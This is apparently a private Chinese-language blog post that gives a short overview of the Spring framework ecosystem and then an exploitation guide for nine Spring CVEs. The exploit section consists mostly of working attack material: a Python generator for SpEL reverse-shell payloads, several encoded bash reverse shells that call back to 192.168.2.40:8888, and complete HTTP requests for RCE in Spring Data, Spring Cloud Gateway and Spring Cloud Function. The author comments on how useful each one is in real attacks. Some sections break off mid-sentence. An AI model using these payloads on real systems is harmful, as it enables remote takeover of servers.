+++
title = 'Spring'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java组件'
+++

# 一、Spring生态

Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。

Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。  


## 
Spring Framework 


Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。 


## 
Spring Boot 


Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。





## Spring Cloud 


Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。 





## Spring Security


Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。

# 二、漏洞原理

Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了

# 三、漏洞利用

## 1、Spring Security OAuth2远程命令执行 CVE-2016-4977

**oauth/authorize**

影响版本：

2.0.0-2.0.9


1.0.0-1.0.5

POC生成脚本：

```
#!/usr/bin/env python
import base64
message = input('Enter message to encode:')
message = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % bytes.decode(base64.b64encode(message.encode('utf-8')))
print(message)
poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ')}'
print(poc)
```

![](/zj_img/WEBRESOURCE99c0ca1e0c911ba4a490361b1b7cf0a8截图.png)

![](/zj_img/WEBRESOURCE3f8fbf5a7c0ac5e5c246fa4f9110237e截图.png)

![](/zj_img/WEBRESOURCE9f7078dae3c0057b578bbc87aadba8c8截图.png)

## 2、Spring Web Flow框架远程代码执行(CVE-2017-4971)

Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，Spring WebFlow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其

POC：

```
原POC:
&_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/192.168.2.40/8888 0>&1")).start()=vulhub

URL编码后：
&_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.2.40/8888 0>%261")).start()=vulhub
```

**但是该漏洞，暂无良好的发现or扫描方式，导致实用性极差.**

## 3、Spring Data Rest远程命令执行命令（CVE-2017-8046）







简单介绍：

Spring Data是对数据访问的更高抽象。通过它，开发者进一步从数据层解放出来，更专注于业务逻辑。不管是关系型数据还是非关系型数据，利用相应接口，开发者可以使用非常简单的代码构建对数据的访问。

漏洞原理：

Pivotal官方发布通告表示Spring-data-rest服务器在处理PATCH请求时存在一个远程代码执行漏洞（CVE-2017-8046）。攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。

影响版本：

Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3


Spring Boot version < 2.0.0M4


Spring Data release trains < Kay-RC3

可能特征：

Restful风格的API服务器

POC：

第一步：

```
",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"))))
```

第二步十进制编码：

![](/zj_img/WEBRESOURCEd189de73ccdc0cac505cc8182e7c3bc5截图.png)

第三步：

![](/zj_img/WEBRESOURCEba857f96719eeb5128fe8b3ad93a74a6截图.png)

**该漏洞因为涉及编码等问题，以及无明显特征，同样实用性较低**

## 4、Spring Messaging远程命令执行突破（CVE-2018-1270）

Spring框架中的 spring-messaging 模块提供了一种基于WebSocket的STOMP协议实现，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring messages中，其允许客户端订阅消息，并使用selector过滤消息，selector用SpEL表达编写，并使用StandardEvaluationContext解析，攻击者可以通过构造恶意的消息来实现远程代码执行。

影响范围：

Spring Framework 5.0 to 5.0.4.


Spring Framework 4.3 to 4.3.14

**该漏洞实战能力极弱**

## 5、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

影响范围：

Spring Data Commons 1.13至1.13.10（Ingalls SR10）


Spring Data REST 2.6至2.6.10（Ingalls SR10）


Spring Data Commons 2.0至2.0.5（Kay SR5）


Spring Data REST 3.0至3.0.5（Kay SR5）

POC:

```
POST /users?page=&size=5 HTTP/1.1
Host: 192.168.2.66:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```

**该漏洞反弹shell，需要使用文件下载脚本，配合执行进行上线，同时无法判断漏洞特征，所以同样实用性较弱**

## 6、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947） 

Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。

漏洞发现：

/actuator/gateway/路径未授权

漏洞利用：

手动需要分多步：

### 第一步添加路由：

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

```

![](/zj_img/WEBRESOURCEc9d04e3193ba7d67a1469dd004d07f8d截图.png)

### 第二步刷新路由：

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0


```

![](/zj_img/WEBRESOURCE0c2424564c990f5f0cbe87e0fdda917d截图.png)

### 第三步查看命令：

```
GET /actuator/gateway/routes/ HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0


```

![](/zj_img/WEBRESOURCEa58b1c4b26327430c4bd453ade6fac2d截图.png)

### 第四步删除路由：

```
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0

 
```

![](/zj_img/WEBRESOURCE9bae7b9e290ff120c2e82989851572de截图.png)

刷新后，重新访问：

![](/zj_img/WEBRESOURCE6f7ece131ca1d0ef650051a88b8644a1截图.png)

目前有发现直接反弹shell工具，以及数量不多的内存马工具。

![](/zj_img/WEBRESOURCEa1c9f9076ad61c8e82f5a8cd8b08da81截图.png)

## 7、Spring Cloud Function SpEL 表达式注入 CVE-2022-22963

Spring Cloud Function是基于Spring Boot 的函数计算框架（FaaS）,当其启用动态路由functionRoute时，HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，恶意攻击者可通过此漏洞发送恶意请求，在服务器执行任意代码。

3.0.0.M3 <= Spring Cloud Function <=3.2.2

POC:

```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test
```

反弹shell，需要base64规避字符串分割问题：

```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}")
Content-Type: text/plain
Content-Length: 4

test
```

此漏洞较为简单，插件可扫描，为重点关注对象。但插件检测结果欠佳，python命令行工具可检测：

![](/zj_img/WEBRESOURCE604f0f4ede3055ab59afdede62ca7a1c截图.png)

## 8、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965） 也就是Spring core RCE

SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值，同时SpringMVC支持多层嵌套的参数绑定。攻击者通过HTTP请求修改日志文件的文件名、文件内容、文件后缀、文件存放路径参数的值，从而在服务器生成木马文件，造成RCE。

影响范围：

JDK版本：JDK 9+


Spring Framework版本：


Spring Framework 5.3.X < 5.3.18


Spring Framework 5.2.X < 5.2.20


注：其他小版本未更新均受影响


影响中间件：Tomcat

检测方式：插件+python工具

坑点：1、插件告知可能存在漏洞；

![](/zj_img/WEBRESOURCE2491adc27093d37527542e019ecf7aef截图.png)

2、由于漏洞原理，造成可能要扫描多次的情况出现：

![](/zj_img/WEBRESOURCE98bd279d223b904a3f324692b286153c截图.png)

## 9、Spring Security Authorization(CVE-2022-22978)

目前来看是垃圾洞

POC：

```
%0a
http://your-ip:8080/admin/%0atest
```